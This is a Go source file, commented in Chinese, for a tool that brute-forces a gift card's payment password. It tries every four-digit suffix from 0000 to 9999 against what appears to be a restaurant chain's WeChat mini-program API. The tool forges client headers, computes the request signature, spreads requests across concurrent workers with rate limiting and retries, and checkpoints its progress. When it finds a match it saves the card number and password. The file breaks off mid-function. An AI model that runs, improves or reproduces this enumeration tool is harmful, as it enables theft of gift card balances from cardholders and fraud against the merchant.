package main

// 礼品卡 paymentCode 顺序枚举工具。
// 新候选始终按 0000~9999 生成；暂时失败进入持久化延迟队列，绝不当作已验证无效。

import (
	"bufio"
	"bytes"
	"container/heap"
	"context"
	"crypto/md5"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

const (
	totalCandidates      = 10000
	checkpointVersion    = 1
	maxResponseBodyBytes = 1 << 20
	newJobsPerRetry      = 10
	runStateKey          = "__run__"
)

var errResponseTooLarge = errors.New("响应体超过大小限制")

// Config 配置文件结构。
type Config struct {
	CardSequence  string `json:"cardSequence"`
	PaymentPrefix string `json:"paymentPrefix"`
	Token         string `json:"token"`
	OpenID        string `json:"openId"`

	SecretKey  string   `json:"secretKey"`
	EncodeList []string `json:"encodeList"`
	Referer    string   `json:"referer"`
	Host       string   `json:"host"`

	ClientKey string `json:"clientKey"`
	ClientSec string `json:"clientSec"`
	SignPath  string `json:"signPath"`
	FullURL   string `json:"fullUrl"`

	Threads           int     `json:"threads"`
	MaxRetry          int     `json:"maxRetry"`          // 快速重试预算，不是丢弃阈值
	RetryWait         int     `json:"retryWait"`         // 指数退避基数（秒）
	RetryMaxWait      int     `json:"retryMaxWait"`      // 自动退避上限（秒）
	MaxAttempts       int     `json:"maxAttempts"`       // 每个复核周期的暂时错误总尝试上限
	ReviewRevision    int     `json:"reviewRevision"`    // 递增后显式重放待复核项
	RequestsPerSecond float64 `json:"requestsPerSecond"` // 全局请求速率
	RequestTimeout    int     `json:"requestTimeout"`    // 单次请求超时（秒）
	CheckpointFile    string  `json:"checkpointFile"`    // 追加式断点日志
}

type RequestBody struct {
	Token                string   `json:"token"`
	CardSequence         string   `json:"cardSequence"`
	PaymentCode          string   `json:"paymentCode"`
	OpenID               *string  `json:"openId,omitempty"`
	EncodeList           []string `json:"encodeList"`
	IsFromCustomerClient bool     `json:"isFromCustomerClient"`
	SecretKey            string   `json:"secretKey"`
}

type APIEnvelope struct {
	ErrCode   json.RawMessage `json:"errCode"`
	ErrData   json.RawMessage `json:"errData"`
	ErrMsg    string          `json:"errMsg"`
	ErrorCode json.RawMessage `json:"errorCode"`
	Data      json.RawMessage `json:"data"`
}

type Decision string

const (
	DecisionFound           Decision = "found"
	DecisionVerifiedInvalid Decision = "verified_invalid"
	DecisionRetry           Decision = "retry"
	DecisionPauseRun        Decision = "pause_run"
	DecisionReview          Decision = "review"
	DecisionCanceled        Decision = "canceled"
)

type RetryScope string

const (
	RetryCandidate RetryScope = "candidate"
	RetryRun       RetryScope = "run"
)

type ErrorKind string

const (
	KindNone               ErrorKind = ""
	KindCanceled           ErrorKind = "canceled"
	KindTimeout            ErrorKind = "timeout"
	KindNetwork            ErrorKind = "network"
	KindTLS                ErrorKind = "tls"
	KindRateLimited        ErrorKind = "rate_limited"
	KindHTTPServer         ErrorKind = "http_server"
	KindHTTPClient         ErrorKind = "http_client"
	KindAuthExpired        ErrorKind = "auth_expired"
	KindInvalidJSON        ErrorKind = "invalid_json"
	KindBodyTooLarge       ErrorKind = "body_too_large"
	KindProtocol           ErrorKind = "protocol"
	KindUnknownBusiness    ErrorKind = "unknown_business"
	KindSuccessWithoutData ErrorKind = "success_without_data"
)

type AttemptResult struct {
	Decision   Decision
	Kind       ErrorKind
	Scope      RetryScope
	HTTPStatus int
	ErrCode    string
	ErrorCode  string
	Message    string
	RetryAfter time.Duration
	Body       []byte
}

type JobState string

const (
	StateInFlight        JobState = "in_flight"
	StateRetryWait       JobState = "retry_wait"
	StateVerifiedInvalid JobState = "verified_invalid"
	StateFound           JobState = "found"
	StateRunBlocked      JobState = "run_blocked"
	StateReviewRequired  JobState = "review_required"
	StateRunCooldown     JobState = "run_cooldown"
)

type ProgressEvent struct {
	Version        int       `json:"version"`
	RunKey         string    `json:"runKey"`
	Suffix         string    `json:"suffix"`
	State          JobState  `json:"state"`
	Attempts       int       `json:"attempts"`
	NextAttemptAt  time.Time `json:"nextAttemptAt,omitempty"`
	ErrorClass     ErrorKind `json:"errorClass,omitempty"`
	HTTPStatus     int       `json:"httpStatus,omitempty"`
	ErrCode        string    `json:"errCode,omitempty"`
	ErrorCode      string    `json:"errorCode,omitempty"`
	LastError      string    `json:"lastError,omitempty"`
	ReviewRevision int       `json:"reviewRevision,omitempty"`
	ResultBody     string    `json:"resultBody,omitempty"`
	UpdatedAt      time.Time `json:"updatedAt"`
}

type Job struct {
	Suffix        string
	Attempts      int
	NextAttemptAt time.Time
	Sequence      int
}

type jobHeap []Job

func (h jobHeap) Len() int { return len(h) }

func (h jobHeap) Less(i, j int) bool {
	if h[i].NextAttemptAt.Equal(h[j].NextAttemptAt) {
		return h[i].Sequence < h[j].Sequence
	}
	return h[i].NextAttemptAt.Before(h[j].NextAttemptAt)
}

func (h jobHeap) Swap(i, j int) { h[i], h[j] = h[j], h[i] }

func (h *jobHeap) Push(x interface{}) { *h = append(*h, x.(Job)) }

func (h *jobHeap) Pop() interface{} {
	old := *h
	n := len(old)
	x := old[n-1]
	*h = old[:n-1]
	return x
}

type WorkerResult struct {
	Job    Job
	Result AttemptResult
}

type RunStatus string

const (
	RunFound      RunStatus = "found"
	RunNotFound   RunStatus = "not_found"
	RunIncomplete RunStatus = "incomplete"
	RunBlocked    RunStatus = "blocked"
	RunCanceled   RunStatus = "canceled"
)

type ScanOutcome struct {
	Found     bool
	Blocked   bool
	Canceled  bool
	FoundCode string
}

type StateCounts struct {
	Invalid    int
	InFlight   int
	Retrying   int
	Review     int
	Blocked    int
	Pending    int
	Found      int
	Unresolved int
}

type progressStore struct {
	file            *os.File
	runKey          string
	writesSinceSync int
}

type instanceLock struct {
	file *os.File
	path string
}

var (
	cfg        Config
	httpClient *http.Client
)

func calcKbsv(timestamp, bodyJSON string) string {
	raw := cfg.ClientKey + "\t" + cfg.ClientSec + "\t" + timestamp + "\t" + cfg.SignPath + "\t\t" + bodyJSON
	h := md5.Sum([]byte(raw))
	return hex.EncodeToString(h[:])
}

func normalizeCode(raw json.RawMessage) (string, bool) {
	value := bytes.TrimSpace(raw)
	if len(value) == 0 || bytes.Equal(value, []byte("null")) {
		return "", false
	}
	if value[0] == '"' {
		var s string
		if err := json.Unmarshal(value, &s); err != nil {
			return "", false
		}
		return s, true
	}

	start := 0
	if value[0] == '-' {
		start = 1
	}
	if start == len(value) {
		return "", false
	}
	for _, c := range value[start:] {
		if c < '0' || c > '9' {
			return "", false
		}
	}
	n, err := strconv.ParseInt(string(value), 10, 64)
	if err != nil {
		return "", false
	}
	return strconv.FormatInt(n, 10), true
}

func decodeEnvelope(body []byte) (APIEnvelope, error) {
	var env APIEnvelope
	decoder := json.NewDecoder(bytes.NewReader(body))
	if err := decoder.Decode(&env); err != nil {
		return env, err
	}
	var extra interface{}
	if err := decoder.Decode(&extra); err != io.EOF {
		if err == nil {
			return env, errors.New("响应包含多个 JSON 值")
		}
		return env, fmt.Errorf("响应尾部不是合法 JSON: %w", err)
	}
	return env, nil
}

func envelopeMessage(env APIEnvelope) string {
	if strings.TrimSpace(env.ErrMsg) != "" {
		return env.ErrMsg
	}
	var s string
	if len(env.ErrData) > 0 && json.Unmarshal(env.ErrData, &s) == nil {
		return s
	}
	return ""
}

func hasResponseData(raw json.RawMessage) bool {
	value := bytes.TrimSpace(raw)
	return len(value) > 0 && !bytes.Equal(value, []byte("null"))
}

func authMessage(message string) bool {
	text := strings.ToLower(message)
	patterns := []string{
		"登录信息过期", "登录已过期", "签名认证失败", "认证失败", "未登录",
		"token expired", "authentication expired", "unauthorized", "login expired",
	}
	for _, pattern := range patterns {
		if strings.Contains(text, strings.ToLower(pattern)) {
			return true
		}
	}
	return false
}

func transientMessage(message string) bool {
	text := strings.ToLower(message)
	patterns := []string{
		"拥堵", "繁忙", "稍后再试", "稍后重试", "请求频繁", "限流", "系统异常",
		"busy", "try again", "rate limit", "temporarily unavailable", "timeout",
	}
	for _, pattern := range patterns {
		if strings.Contains(text, strings.ToLower(pattern)) {
			return true
		}
	}
	return false
}

func verifiedInvalidResponse(errCode, errorCode string) bool {
	// 接口存在两种已确认的错误码表示：标准 541，以及 EGC 的复合码。
	// 使用精确白名单，避免 strings.Contains("541") 带来的误判。
	return errCode == "541" || errCode == "500541" || errorCode == "52520541"
}

func congestionResponse(errCode, errorCode string) bool {
	return errCode == "52520429" || errorCode == "52520429"
}

func classifyAttempt(httpStatus int, body []byte, requestErr error) AttemptResult {
	result := AttemptResult{HTTPStatus: httpStatus, Body: body, Scope: RetryCandidate}
	if requestErr != nil {
		result.Message = requestErr.Error()
		if errors.Is(requestErr, context.Canceled) {
			result.Decision = DecisionCanceled
			result.Kind = KindCanceled
			return result
		}
		if errors.Is(requestErr, errResponseTooLarge) {
			result.Decision = DecisionReview
			result.Kind = KindBodyTooLarge
			return result
		}
		if errors.Is(requestErr, context.DeadlineExceeded) {
			result.Decision = DecisionRetry
			result.Kind = KindTimeout
			return result
		}
		var netErr net.Error
		if errors.As(requestErr, &netErr) && netErr.Timeout() {
			result.Decision = DecisionRetry
			result.Kind = KindTimeout
			return result
		}
		lower := strings.ToLower(requestErr.Error())
		if strings.Contains(lower, "certificate") || strings.Contains(lower, "tls handshake") || strings.Contains(lower, "unsupported protocol") || strings.Contains(lower, "no such host") {
			result.Decision = DecisionPauseRun
			result.Kind = KindTLS
			result.Scope = RetryRun
			return result
		}
		result.Decision = DecisionRetry
		result.Kind = KindNetwork
		return result
	}

	env, decodeErr := decodeEnvelope(body)
	errCode, _ := normalizeCode(env.ErrCode)
	errorCode, _ := normalizeCode(env.ErrorCode)
	message := envelopeMessage(env)
	result.ErrCode = errCode
	result.ErrorCode = errorCode
	result.Message = message

	// 认证问题优先级最高，业务码可能出现在 errCode 或 errorCode。
	if errCode == "4000099" || errorCode == "4000099" || ((httpStatus == http.StatusUnauthorized || httpStatus == http.StatusForbidden) && decodeErr != nil) || authMessage(message) {
		result.Decision = DecisionPauseRun
		result.Kind = KindAuthExpired
		result.Scope = RetryRun
		return result
	}
	if httpStatus == http.StatusUnauthorized || httpStatus == http.StatusForbidden {
		result.Decision = DecisionPauseRun
		result.Kind = KindAuthExpired
		result.Scope = RetryRun
		return result
	}

	if httpStatus < 200 || httpStatus >= 300 {
		switch {
		case httpStatus == http.StatusRequestTimeout || httpStatus == http.StatusTooEarly:
			result.Decision = DecisionRetry
			result.Kind = KindHTTPServer
		case httpStatus == http.StatusMisdirectedRequest || httpStatus == http.StatusTooManyRequests || httpStatus >= 500:
			result.Decision = DecisionRetry
			result.Scope = RetryRun
			if httpStatus == http.StatusTooManyRequests {
				result.Kind = KindRateLimited
			} else {
				result.Kind = KindHTTPServer
			}
		default:
			result.Decision = DecisionPauseRun
			result.Kind = KindHTTPClient
			result.Scope = RetryRun
		}
		if result.Message == "" {
			result.Message = http.StatusText(httpStatus)
		}
		return result
	}

	if decodeErr != nil {
		result.Decision = DecisionRetry
		result.Kind = KindInvalidJSON
		result.Message = decodeErr.Error()
		return result
	}
	if errCode == "0" && hasResponseData(env.Data) {
		result.Decision = DecisionFound
		result.Kind = KindNone
		return result
	}
	if verifiedInvalidResponse(errCode, errorCode) {
		result.Decision = DecisionVerifiedInvalid
		result.Kind = KindNone
		return result
	}
	if congestionResponse(errCode, errorCode) {
		result.Decision = DecisionRetry
		result.Kind = KindRateLimited
		result.Scope = RetryRun
		if result.Message == "" {
			result.Message = "服务拥堵"
		}
		return result
	}
	if errCode == "0" {
		result.Decision = DecisionRetry
		result.Kind = KindSuccessWithoutData
		if result.Message == "" {
			result.Message = "errCode=0 但响应缺少 data"
		}
		return result
	}
	if transientMessage(message) {
		result.Decision = DecisionRetry
		result.Kind = KindHTTPServer
		return result
	}
	result.Decision = DecisionRetry
	result.Kind = KindUnknownBusiness
	if result.Message == "" {
		result.Message = "未知业务响应"
	}
	return result
}

func parseRetryAfter(value string, now time.Time) time.Duration {
	value = strings.TrimSpace(value)
	if value == "" {
		return 0
	}
	if seconds, err := strconv.ParseUint(value, 10, 64); err == nil {
		const maxSeconds = uint64((24 * time.Hour) / time.Second)
		if seconds > maxSeconds {
			seconds = maxSeconds
		}
		return time.Duration(seconds) * time.Second
	}
	when, err := http.ParseTime(value)
	if err != nil || !when.After(now) {
		return 0
	}
	delay := when.Sub(now)
	if delay > 24*time.Hour {
		return 24 * time.Hour
	}
	return delay
}

func readResponseBody(resp *http.Response, maxBytes int64) ([]byte, error) {
	data, err := io.ReadAll(io.LimitReader(resp.Body, maxBytes+1))
	if err != nil {
		return nil, err
	}
	if int64(len(data)) > maxBytes {
		return nil, errResponseTooLarge
	}
	return data, nil
}

func tryOne(ctx context.Context, suffix string) AttemptResult {
	paymentCode := cfg.PaymentPrefix + suffix
	timestamp := strconv.FormatInt(time.Now().UnixMilli(), 10)
	body := RequestBody{
		Token:                cfg.Token,
		CardSequence:         cfg.CardSequence,
		PaymentCode:          paymentCode,
		EncodeList:           cfg.EncodeList,
		IsFromCustomerClient: true,
		SecretKey:            cfg.SecretKey,
	}
	if cfg.OpenID != "" {
		oid := cfg.OpenID
		body.OpenID = &oid
	}

	bodyBytes, err := json.Marshal(body)
	if err != nil {
		return AttemptResult{Decision: DecisionPauseRun, Kind: KindProtocol, Scope: RetryRun, Message: err.Error()}
	}
	bodyJSON := string(bodyBytes)
	req, err := http.NewRequestWithContext(ctx, http.MethodPost, cfg.FullURL, strings.NewReader(bodyJSON))
	if err != nil {
		return AttemptResult{Decision: DecisionPauseRun, Kind: KindHTTPClient, Scope: RetryRun, Message: err.Error()}
	}

	req.Header.Set("Accept", "*/*")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Yumc-Route-Cell", "yumc4")
	req.Header.Set("X-Yumc-Route-Channel", "weapp")
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 MicroMessenger/7.0.20.1781(0x6700143B) NetType/WIFI MiniProgramEnv/Windows WindowsWechat/WMPF")
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Rcsdcid", "rcsdcid")
	req.Header.Set("Rcsav", "")
	req.Header.Set("Wechat-Platform", "windows")
	req.Header.Set("Wechat-Os-Version", "Windows 11 x64")
	req.Header.Set("Wechat-Language", "zh_CN")
	req.Header.Set("Wechat-Version", "4.1.11.23")
	req.Header.Set("Wechat-Model", "microsoft")
	req.Header.Set("Wechat-Pixelratio", "1")
	req.Header.Set("Xweb_Xhr", "1")
	req.Header.Set("Sec-Fetch-Site", "cross-site")
	req.Header.Set("Sec-Fetch-Mode", "cors")
	req.Header.Set("Sec-Fetch-Dest", "empty")
	req.Header.Set("Accept-Language", "zh-CN,zh;q=0.9")
	if cfg.Referer != "" {
		req.Header.Set("Referer", cfg.Referer)
	}
	if cfg.Host != "" {
		req.Host = cfg.Host
	}
	req.Header.Set("kbck", cfg.ClientKey)
	req.Header.Set("kbcts", timestamp)
	req.Header.Set("kbsv", calcKbsv(timestamp, bodyJSON))

	resp, err := httpClient.Do(req)
	if err != nil {
		return classifyAttempt(0, nil, err)
	}
	defer resp.Body.Close()

	encoding := strings.TrimSpace(resp.Header.Get("Content-Encoding"))
	if encoding != "" && !strings.EqualFold(encoding, "identity") {
		return AttemptResult{
			Decision:   DecisionPauseRun,
			Kind:       KindProtocol,
			Scope:      RetryRun,
			HTTPStatus: resp.StatusCode,
			Message:    "服务端返回了未解压的 Content-Encoding: " + encoding,
		}
	}
	data, err := readResponseBody(resp, maxResponseBodyBytes)
	if err != nil {
		return classifyAttempt(resp.StatusCode, nil, err)
	}
	result := classifyAttempt(resp.StatusCode, data, nil)
	result.RetryAfter = parseRetryAfter(resp.Header.Get("Retry-After"), time.Now())
	return result
}

func candidateSuffixes() []string {
	result := make([]string, totalCandidates)
	for i := 0; i < totalCandidates; i++ {
		result[i] = fmt.Sprintf("%04d", i)
	}
	return result
}

func deriveRunStatus(total, invalid, unresolved int, found, blocked bool) RunStatus {
	if found {
		return RunFound
	}
	if blocked {
		return RunBlocked
	}
	if invalid == total && unresolved == 0 {
		return RunNotFound
	}
	return RunIncomplete
}

func runKeyForConfig(config Config) string {
	// token 可以正常轮换；其余会改变请求或签名语义的字段都必须进入指纹。
	semanticConfig := struct {
		Version       int
		CardSequence  string
		PaymentPrefix string
		OpenID        string
		SecretKey     string
		EncodeList    []string
		Referer       string
		Host          string
		ClientKey     string
		ClientSec     string
		SignPath      string
		FullURL       string
	}{
		Version: checkpointVersion, CardSequence: config.CardSequence,
		PaymentPrefix: config.PaymentPrefix, OpenID: config.OpenID,
		SecretKey: config.SecretKey, EncodeList: config.EncodeList,
		Referer: config.Referer, Host: config.Host, ClientKey: config.ClientKey,
		ClientSec: config.ClientSec, SignPath: config.SignPath, FullURL: config.FullURL,
	}
	raw, _ := json.Marshal(semanticConfig)
	sum := sha256.Sum256(raw)
	return hex.EncodeToString(sum[:])
}

func acquireInstanceLock(checkpointPath string) (*instanceLock, error) {
	lockPath := checkpointPath + ".lock"
	dir := filepath.Dir(lockPath)
	if dir != "." && dir != "" {
		if err := os.MkdirAll(dir, 0755); err != nil {
			return nil, err
		}
	}
	file, err := os.OpenFile(lockPath, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0600)
	if err != nil {
		if errors.Is(err, os.ErrExist) {
			return nil, fmt.Errorf("检查点已被另一个进程使用；若确认没有程序在运行，请删除 %s", lockPath)
		}
		return nil, err
	}
	content := fmt.Sprintf("pid=%d\nstartedAt=%s\n", os.Getpid(), time.Now().UTC().Format(time.RFC3339Nano))
	if _, err := file.WriteString(content); err != nil {
		file.Close()
		os.Remove(lockPath)
		return nil, err
	}
	if err := file.Sync(); err != nil {
		file.Close()
		os.Remove(lockPath)
		return nil, err
	}
	return &instanceLock{file: file, path: lockPath}, nil
}

func (l *instanceLock) Release() error {
	if l == nil {
		return nil
	}
	var closeErr error
	if l.file != nil {
		closeErr = l.file.Close()
	}
	removeErr := os.Remove(l.path)
	if errors.Is(removeErr, os.ErrNotExist) {
		removeErr = nil
	}
	if closeErr != nil {
		return closeErr
	}
	return removeErr
}

func validSuffix(suffix string) bool {
	if len(suffix) != 4 {
		return false
	}
	for _, c := range suffix {
		if c < '0' || c > '9' {
			return false
		}
	}
	return true
}

func repairCheckpointTail(path string) error {
	file, err := os.OpenFile(path, os.O_RDWR, 0600)
	if errors.Is(err, os.ErrNotExist) {
		return nil
	}
	if err != nil {
		return err
	}
	stat, err := file.Stat()
	if err != nil {
		file.Close()
		return err
	}
	size := stat.Size()
	if size == 0 {
		return file.Close()
	}

	lastByte := []byte{0}
	if _, err := file.ReadAt(lastByte, size-1); err != nil {
		file.Close()
		return err
	}
	if lastByte[0] == '\n' {
		return file.Close()
	}

	// 找出最后一个完整换行。writer 总是逐行追加；没有换行的尾部要么是
	// 已完整写入但缺少终止符的事件，要么是崩溃留下的半条 JSON。
	const blockSize int64 = 4096
	recordStart := int64(0)
	for end := size; end > 0; {
		start := end - blockSize
		if start < 0 {
			start = 0
		}
		block := make([]byte, end-start)
		if _, err := file.ReadAt(block, start); err != nil {
			file.Close()
			return err
		}
		if index := bytes.LastIndexByte(block, '\n'); index >= 0 {
			recordStart = start + int64(index) + 1
			break
		}
		end = start
	}

	tailLength := size - recordStart
	validTail := false
	if tailLength > 0 && tailLength <= 8*1024*1024 {
		tail := make([]byte, tailLength)
		if _, err := file.ReadAt(tail, recordStart); err != nil {
			file.Close()
			return err
		}
		var event ProgressEvent
		validTail = json.Unmarshal(bytes.TrimSpace(tail), &event) == nil
	}

	if validTail {
		if _, err := file.WriteAt([]byte{'\n'}, size); err != nil {
			file.Close()
			return err
		}
	} else if err := file.Truncate(recordStart); err != nil {
		file.Close()
		return err
	}
	if err := file.Sync(); err != nil {
		file.Close()
		return err
	}
	return file.Close()
}

func loadProgress(path, runKey string) (map[string]ProgressEvent, error) {
	records := make(map[string]ProgressEvent, totalCandidates)
	file, err := os.Open(path)
	if errors.Is(err, os.ErrNotExist) {
		return records, nil
	}
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	scanner.Buffer(make([]byte, 64*1024), 8*1024*1024)
	lineNumber := 0
	for scanner.Scan() {
		lineNumber++
		line := bytes.TrimSpace(scanner.Bytes())
		if len(line) == 0 {
			continue
		}
		var event ProgressEvent
		if err := json.Unmarshal(line, &event); err != nil {
			fmt.Printf("警告: 忽略检查点第 %d 行的损坏记录: %v\n", lineNumber, err)
			continue
		}
		if event.Version != checkpointVersion {
			return nil, fmt.Errorf("检查点版本 %d 不受支持", event.Version)
		}
		if event.RunKey != runKey {
			return nil, fmt.Errorf("检查点属于另一张卡或不同的请求配置；请更换 checkpointFile")
		}
		if event.Suffix != runStateKey && !validSuffix(event.Suffix) {
			fmt.Printf("警告: 忽略检查点中的非法后缀 %q\n", event.Suffix)
			continue
		}
		records[event.Suffix] = event
	}
	if err := scanner.Err(); err != nil {
		return nil, err
	}
	return records, nil
}

func openProgressStore(path, runKey string) (*progressStore, error) {
	dir := filepath.Dir(path)
	if dir != "." && dir != "" {
		if err := os.MkdirAll(dir, 0755); err != nil {
			return nil, err
		}
	}
	file, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0600)
	if err != nil {
		return nil, err
	}
	return &progressStore{file: file, runKey: runKey}, nil
}

func (s *progressStore) Append(event ProgressEvent, critical bool) error {
	event.Version = checkpointVersion
	event.RunKey = s.runKey
	event.UpdatedAt = time.Now().UTC()
	data, err := json.Marshal(event)
	if err != nil {
		return err
	}
	data = append(data, '\n')
	if _, err := s.file.Write(data); err != nil {
		return err
	}
	s.writesSinceSync++
	if critical || s.writesSinceSync >= 25 {
		if err := s.file.Sync(); err != nil {
			return err
		}
		s.writesSinceSync = 0
	}
	return nil
}

func (s *progressStore) Close() error {
	if s == nil || s.file == nil {
		return nil
	}
	if err := s.file.Sync(); err != nil {
		s.file.Close()
		return err
	}
	return s.file.Close()
}

func buildQueues(records map[string]ProgressEvent) ([]Job, jobHeap, string) {
	freshCapacity := totalCandidates - len(records)
	if freshCapacity < 0 {
		freshCapacity = 0
	}
	fresh := make([]Job, 0, freshCapacity)
	retries := make(jobHeap, 0, len(records))
	foundSuffix := ""
	for sequence, suffix := range candidateSuffixes() {
		event, ok := records[suffix]
		if !ok {
			fresh = append(fresh, Job{Suffix: suffix, Sequence: sequence})
			continue
		}
		// 兼容旧版本检查点：已记录了明确 EGC 错误码的待重试/待复核项
		// 可以直接升级为确定排除，无需再次访问接口。
		if (event.State == StateRetryWait || event.State == StateReviewRequired) && verifiedInvalidResponse(event.ErrCode, event.ErrorCode) {
			event.State = StateVerifiedInvalid
			event.NextAttemptAt = time.Time{}
			records[suffix] = event
			continue
		}
		switch event.State {
		case StateVerifiedInvalid:
			continue
		case StateFound:
			foundSuffix = suffix
		case StateInFlight, StateRetryWait:
			retries = append(retries, Job{Suffix: suffix, Attempts: event.Attempts, NextAttemptAt: event.NextAttemptAt, Sequence: sequence})
		case StateRunBlocked:
			// 更新 token 后，优先用阻塞项探测认证是否已经恢复。
			retries = append(retries, Job{Suffix: suffix, Attempts: 0, NextAttemptAt: time.Time{}, Sequence: sequence})
		case StateReviewRequired:
			// 待复核项只在用户显式递增 reviewRevision 后进入新的复核周期。
			if cfg.ReviewRevision > event.ReviewRevision {
				retries = append(retries, Job{Suffix: suffix, Attempts: 0, NextAttemptAt: time.Now(), Sequence: sequence})
			}
		default:
			fresh = append(fresh, Job{Suffix: suffix, Attempts: event.Attempts, Sequence: sequence})
		}
	}
	heap.Init(&retries)
	return fresh, retries, foundSuffix
}

func makeEvent(job Job, state JobState, result AttemptResult, next time.Time) ProgressEvent {
	message := strings.ReplaceAll(result.Message, "\r", " ")
	message = strings.ReplaceAll(message, "\n", " ")
	message = truncate(message, 300)
	return ProgressEvent{
		Suffix:         job.Suffix,
		State:          state,
		Attempts:       job.Attempts,
		NextAttemptAt:  next.UTC(),
		ErrorClass:     result.Kind,
		HTTPStatus:     result.HTTPStatus,
		ErrCode:        result.ErrCode,
		ErrorCode:      result.ErrorCode,
		LastError:      message,
		ReviewRevision: cfg.ReviewRevision,
	}
}

func persistEvent(store *progressStore, records map[string]ProgressEvent, event ProgressEvent, critical bool) error {
	if err := store.Append(event, critical); err != nil {
		return err
	}
	event.Version = checkpointVersion
	event.RunKey = store.runKey
	event.UpdatedAt = time.Now().UTC()
	records[event.Suffix] = event
	return nil
}

func ambiguousKind(kind ErrorKind) bool {
	switch kind {
	case KindInvalidJSON, KindProtocol, KindUnknownBusiness, KindSuccessWithoutData, KindBodyTooLarge:
		return true
	default:
		return false
	}
}

func retryLimit(result AttemptResult) int {
	if ambiguousKind(result.Kind) {
		return cfg.MaxRetry + 1 // 首次尝试 + 快速重试预算
	}
	return cfg.MaxAttempts
}

func retryDelay(attempts int, result AttemptResult, rng *rand.Rand) time.Duration {
	base := time.Duration(cfg.RetryWait) * time.Second
	capDelay := time.Duration(cfg.RetryMaxWait) * time.Second
	shift := attempts - 1
	if shift < 0 {
		shift = 0
	}
	if shift > 20 {
		shift = 20
	}
	upper := base
	for i := 0; i < shift && upper < capDelay; i++ {
		if upper > capDelay/2 {
			upper = capDelay
			break
		}
		upper *= 2
	}
	var delay time.Duration
	if upper > 0 {
		delay = time.Duration(rng.Int63n(int64(upper) + 1))
	}
	if result.RetryAfter > delay {
		delay = result.RetryAfter
	}
	if result.Scope == RetryRun && delay < base {
		delay = base
	}
	return delay
}

func requestInterval(requestsPerSecond float64) time.Duration {
	if requestsPerSecond <= 0 {
		return 0
	}
	interval := time.Duration(float64(time.Second) / requestsPerSecond)
	if interval < time.Nanosecond {
		return time.Nanosecond
	}
	return interval
}

func startWorkers(ctx context.Context, count int, jobs <-chan Job, results chan<- WorkerResult, wg *sync.WaitGroup) {
	for i := 0; i < count; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case job, ok := <-jobs:
					if !ok {
						return
					}
					result := tryOne(ctx, job.Suffix)
					select {
					case results <- WorkerResult{Job: job, Result: result}:
					case <-ctx.Done():
						return
					}
				}
			}
		}()
	}
}

func stopTimer(timer *time.Timer) {
	if timer == nil {
		return
	}
	if !timer.Stop() {
		select {
		case <-timer.C:
		default:
		}
	}
}

func writeFoundResult(paymentCode string, body []byte) error {
	content := []byte(fmt.Sprintf(
		"卡号(cardSequence): %s\n密码(paymentCode):   %s\n响应: %s\n",
		cfg.CardSequence, paymentCode, string(body),
	))
	dir := "."
	tmp, err := os.CreateTemp(dir, ".found_payment-*.tmp")
	if err != nil {
		return err
	}
	tmpName := tmp.Name()
	defer os.Remove(tmpName)
	if err := tmp.Chmod(0600); err != nil {
		tmp.Close()
		return err
	}
	if _, err := tmp.Write(content); err != nil {
		tmp.Close()
		return err
	}
	if err := tmp.Sync(); err != nil {
		tmp.Close()
		return err
	}
	if err := tmp.Close(); err != nil {
		return err
	}
	const target = "found_payment.txt"
	if err := os.Rename(tmpName, target); err != nil {
		if _, statErr := os.Stat(target); statErr == nil {
			if removeErr := os.Remove(target); removeErr != nil {
				return removeErr
			}
			return os.Rename(tmpName, target)
		}
		return err
	}
	return nil
}

func handleWorkerResult(
	workerResult WorkerResult,
	retries *jobHeap,
	records map[string]ProgressEvent,
	store *progressStore,
	rng *rand.Rand,
	globalNotBefore *time.Time,
) (found bool, blocked bool, canceled bool, err error) {
	job := workerResult.Job
	result := workerResult.Result
	now := time.Now()

	switch result.Decision {
	case DecisionFound:
		paymentCode := cfg.PaymentPrefix + job.Suffix
		event := makeEvent(job, StateFound, result, time.Time{})
		event.ResultBody = string(result.Body)
		if err := persistEvent(store, records, event, true); err != nil {
			return false, false, false, err
		}
		if err := writeFoundResult(paymentCode, result.Body); err != nil {
			return false, false, false, fmt.Errorf("成功状态已写入检查点，但保存结果文件失败: %w", err)
		}
		fmt.Printf("\n%s\n", strings.Repeat("=", 60))
		fmt.Printf(">>> 找到确定结果\n>>> 卡号: %s\n>>> 密码: %s\n", cfg.CardSequence, paymentCode)
		fmt.Printf(">>> 响应: %s\n%s\n", truncate(string(result.Body), 500), strings.Repeat("=", 60))
		return true, false, false, nil

	case DecisionVerifiedInvalid:
		event := makeEvent(job, StateVerifiedInvalid, result, time.Time{})
		if err := persistEvent(store, records, event, false); err != nil {
			return false, false, false, err
		}
		return false, false, false, nil

	case DecisionPauseRun:
		event := makeEvent(job, StateRunBlocked, result, time.Time{})
		if err := persistEvent(store, records, event, true); err != nil {
			return false, false, false, err
		}
		fmt.Printf("\n扫描已暂停 [%s]: %s\n", result.Kind, result.Message)
		return false, true, false, nil

	case DecisionReview:
		event := makeEvent(job, StateReviewRequired, result, time.Time{})
		if err := persistEvent(store, records, event, true); err != nil {
			return false, false, false, err
		}
		return false, false, false, nil

	case DecisionCanceled:
		return false, false, true, nil

	case DecisionRetry:
		delay := retryDelay(job.Attempts, result, rng)
		next := now.Add(delay)
		if result.Scope == RetryRun {
			runNext := next
			if previous, ok := records[runStateKey]; ok && previous.NextAttemptAt.After(runNext) {
				runNext = previous.NextAttemptAt
			}
			runEvent := makeEvent(Job{Suffix: runStateKey}, StateRunCooldown, result, runNext)
			if err := persistEvent(store, records, runEvent, true); err != nil {
				return false, false, false, err
			}
			if runNext.After(*globalNotBefore) {
				*globalNotBefore = runNext
			}
		}

		limit := retryLimit(result)
		if limit > 0 && job.Attempts >= limit {
			event := makeEvent(job, StateReviewRequired, result, time.Time{})
			if err := persistEvent(store, records, event, true); err != nil {
				return false, false, false, err
			}
